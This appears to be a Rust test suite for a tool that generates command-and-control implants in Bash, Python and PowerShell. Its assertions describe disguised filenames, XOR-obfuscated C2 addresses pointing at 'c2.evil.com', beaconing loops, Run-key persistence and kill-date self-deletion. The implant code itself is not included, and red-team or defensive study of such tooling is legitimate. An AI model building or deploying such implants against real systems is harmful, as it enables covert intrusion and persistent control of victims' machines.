use super::*;

fn default_config() -> ImplantConfig {
    ImplantConfig {
        platform: ImplantPlatform::Bash,
        c2_servers: vec!["https://cdn.legit-service.com/api".to_string()],
        dns_domain: "c2.evil.com".to_string(),
        sleep_secs: 30,
        jitter_pct: 0.15,
        kill_date: Some("2025-12-31".to_string()),
        implant_id: "imp-test-42".to_string(),
        encryption_key_hex: "deadbeefcafebabe1234567890abcdef".to_string(),
        registry_persistence: false,
    }
}

#[test]
fn test_bash_implant_generation() {
    let config = default_config();
    let implant = generate_implant(&config);
    assert_eq!(implant.platform, ImplantPlatform::Bash);
    assert_eq!(implant.filename, "health_monitor.sh");
    assert!(implant.source_code.contains("#!/bin/bash"));
    assert!(implant.source_code.contains("curl"));
    assert!(implant.source_code.contains("dig"));
    assert!(implant.source_code.contains("c2.evil.com"));
    assert!(implant.source_code.contains("imp-test-42"));
    assert!(implant.source_code.contains("KILL_DATE=\"2025-12-31\""));
    assert!(implant.source_code.contains("while true"));
}

#[test]
fn test_bash_implant_no_kill_date() {
    let mut config = default_config();
    config.kill_date = None;
    let implant = generate_implant(&config);
    assert!(!implant.source_code.contains("KILL_DATE"));
}

#[test]
fn test_python_implant_generation() {
    let mut config = default_config();
    config.platform = ImplantPlatform::Python;
    let implant = generate_implant(&config);
    assert_eq!(implant.platform, ImplantPlatform::Python);
    assert_eq!(implant.filename, "diagnostics_agent.py");
    assert!(implant.source_code.contains("#!/usr/bin/env python3"));
    assert!(implant.source_code.contains("urllib.request"));
    assert!(implant.source_code.contains("time.sleep"));
    assert!(implant.source_code.contains("deobf"));
    assert!(implant.source_code.contains("XOR_KEY"));
    // C2 URL should NOT appear in plaintext (it's XOR obfuscated)
    assert!(!implant
        .source_code
        .contains("https://cdn.legit-service.com/api"));
}

#[test]
fn test_python_xor_obfuscation_works() {
    let key: u8 = 0x5A;
    let original = "test string";
    let obfuscated = xor_obfuscate(original, key);
    // Deobfuscate manually
    let raw = base64::engine::general_purpose::STANDARD
        .decode(&obfuscated)
        .expect("base64 decode");
    let deobfuscated: String = raw.iter().map(|b| (b ^ key) as char).collect();
    assert_eq!(deobfuscated, original);
}

#[test]
fn test_powershell_implant_generation() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    let implant = generate_implant(&config);
    assert_eq!(implant.platform, ImplantPlatform::PowerShell);
    assert_eq!(implant.filename, "SystemHealthMonitor.ps1");
    assert!(implant.source_code.contains("Invoke-WebRequest"));
    assert!(implant.source_code.contains("Resolve-DnsName"));
    assert!(implant.source_code.contains("Start-Sleep"));
    assert!(implant.source_code.contains("Deobf"));
    assert!(implant.source_code.contains("c2.evil.com"));
}

#[test]
fn test_powershell_registry_persistence() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    config.registry_persistence = true;
    let implant = generate_implant(&config);
    assert!(implant
        .source_code
        .contains("HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
    assert!(implant.source_code.contains("SystemHealthMonitor"));
}

#[test]
fn test_powershell_no_persistence() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    config.registry_persistence = false;
    let implant = generate_implant(&config);
    assert!(!implant.source_code.contains("HKCU:"));
}

#[test]
fn test_powershell_kill_date() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    config.kill_date = Some("2025-06-01".to_string());
    let implant = generate_implant(&config);
    assert!(implant.source_code.contains("2025-06-01"));
    assert!(implant.source_code.contains("Remove-Item"));
}

#[test]
fn test_generate_all_implants() {
    let config = default_config();
    let implants = generate_all_implants(&config);
    assert_eq!(implants.len(), 3);
    let platforms: Vec<ImplantPlatform> = implants.iter().map(|i| i.platform).collect();
    assert!(platforms.contains(&ImplantPlatform::Bash));
    assert!(platforms.contains(&ImplantPlatform::Python));
    assert!(platforms.contains(&ImplantPlatform::PowerShell));
}

#[test]
fn test_validate_implant_bash_passes() {
    let config = default_config();
    let implant = generate_implant(&config);
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "unexpected issues: {issues:?}");
}

#[test]
fn test_validate_implant_python_passes() {
    let mut config = default_config();
    config.platform = ImplantPlatform::Python;
    let implant = generate_implant(&config);
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "unexpected issues: {issues:?}");
}

#[test]
fn test_validate_implant_powershell_passes() {
    let mut config = default_config();
    config.platform = ImplantPlatform::PowerShell;
    let implant = generate_implant(&config);
    let issues = validate_implant(&implant, &config);
    assert!(issues.is_empty(), "unexpected issues: {issues:?}");
}

#[test]
fn test_validate_empty_implant_fails() {
    let config = default_config();
    let bad = GeneratedImplant {
        platform: ImplantPlatform::Bash,
        source_code: String::new(),
        filename: "bad.sh".to_string(),
        description: "broken".to_string(),
    };
    let issues = validate_implant(&bad, &config);
    assert!(!issues.is_empty());
    assert!(issues.iter().any(|i| i.contains("empty")));
}

#[test]
fn test_implant_platform_display() {
    assert_eq!(ImplantPlatform::Bash.to_string(), "Bash");
    assert_eq!(ImplantPlatform::Python.to_string(), "Python");
    assert_eq!(ImplantPlatform::PowerShell.to_string(), "PowerShell");
}

#[test]
fn test_config_default() {
    let config = ImplantConfig::default();
    assert_eq!(config.platform, ImplantPlatform::Bash);
    assert_eq!(config.sleep_secs, 60);
    assert!(!config.registry_persistence);
}

#[test]
fn test_all_implants_validated() {
    let config = default_config();
    let implants = generate_all_implants(&config);
    for implant in &implants {
        let mut cfg = config.clone();
        cfg.platform = implant.platform;
        let issues = validate_implant(implant, &cfg);
        assert!(
            issues.is_empty(),
            "{}: unexpected issues: {issues:?}",
            implant.platform
        );
    }
}
